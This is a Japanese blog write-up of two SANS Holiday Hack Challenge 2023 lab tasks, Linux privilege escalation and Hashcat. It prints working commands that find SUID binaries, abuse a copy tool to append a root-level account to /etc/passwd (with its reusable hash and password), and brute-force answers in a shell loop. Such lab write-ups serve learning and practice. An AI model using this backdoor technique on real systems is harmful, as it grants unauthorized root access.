---
title: "SANS Holiday Hack Challenge (Kringlecon) 2023 Writeup"
date: 2024-01-06T12:00:00+09:00
lastmod: 2024-01-06T12:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fkringlecon_2023%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://2023.kringlecon.com/](https://2023.kringlecon.com/)
<br /><br />

新年明けまして おめでとうございます！

SANS の Holiday Hack Challenge (Kringlecon) 2023 をちょっとだけやりました。

チャレンジ自体にたどり着くまでにアバターを移動させないといけないのが面倒くさ過ぎて、今年も少ししかやっていません（以下）。


<br />

<img src="https://captureamerica.github.io/writeups/img/kringlecon_2023_Objectives.png" alt="kringlecon_2023_Objectives.png">





<br />

<br /><br />
## Linux PrivEsc (Difficulty: 3)
- - -
### Challenge
> Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

（別のチャレンジ文もあったかもしれません。）


<br />
### Solution

まずは、SUIDがセットされているファイルを探します。

<pre>
$ find / -perm -u=s -type f 2>/dev/null
:
(snip)
:
/usr/bin/simplecopy
</pre>

<br/>
<br/>

見慣れない simplecopy というのが居たので、実行してみます。

<pre>
$ /usr/bin/simplecopy
Usage: /usr/bin/simplecopy &lt;source> &lt;destination>
</pre>

<br/>
<br/>

任意のファイルを上書きできそうなので、/etc/password にアカウントを追加します。

<pre>
$ cp /etc/passwd .
$ echo root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash >> passwd
$ /usr/bin/simplecopy passwd /etc/passwd
$ su root2
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
</pre>

/etc/passwd に追加するやつは使いまわしができるので、Linuxの権限昇格をよくやる人は、手元に一個持っておくといいです。

上記の例だと、パスワードは、`mrcake` になります。

<br />
<br />

rootユーザのホーム (/root) に、runmetoanswerというファイルがあって、実行すると簡単なクイズが表示されます。

<pre>
# /root/runmetoanswer
Who delivers Chrismas presents?

>
</pre>

ま、サンタクロースなのは間違いないんですが、大文字小文字の区別があったり、ピッタリ回答が合わないとフラグは貰えません。

<br />
<br />

`strace` や `ltrace` とかも使えないし、`strings` は大量のアウトプットが出るので、そこから答えのヒントを見つけるのが難しいかもしれませんが、いちおう `/etc/runtoanswer.yaml` を参照しているのは見つかります（以下）。

<img src="https://captureamerica.github.io/writeups/img/kringlecon_2023_strings.png" alt="kringlecon_2023_strings.png">

<br />
<br />

自分は別の方法でこのファイル（`/etc/runtoanswer.yaml`）を見つけたと思うんですが、このブログを書いている時点で全く記憶に残っていないし、メモも取ってなかったので、わからないです。ごめんなさい。たぶん、`grep` か `find` です。

<br />
<br />
`/etc/runtoanswer.yaml` の中を見たら、答え `santa` が見つかります。


<br /><br />
<br /><br />
## Hashcat (Difficulty: 2)
- - -
### Challenge
> Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!

（別のチャレンジ文もあったかもしれません。）

<br />
### Solution

hash.txt の中身を見ると、`$krb5asrep` で始まっていて、ググってみると `-m 18200` を指定するとよさそうなので、やってみます。

<img src="https://captureamerica.github.io/writeups/img/kringlecon_2023_hashcat.png" alt="kringlecon_2023_hashcat.png">

<br /><br />

`1LuvCandyC4n3s!2022` か `iLuvCandyCan3s!23!` 辺りが正解なのかと思ったんですが、これらは正解ではありませんでした。

<br /><br />

そもそも、パスワードリスト (password_list.txt) の中には、それほど沢山のパスワードは含まれていないので、Brute Forceしちゃうことにしました。

<pre>
$ for pass in $(cat password_list.txt); do echo $pass | /bin/runtoanswer & done
</pre>

<br />

これで `hashcat` を使わなくてもクリアできます。



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
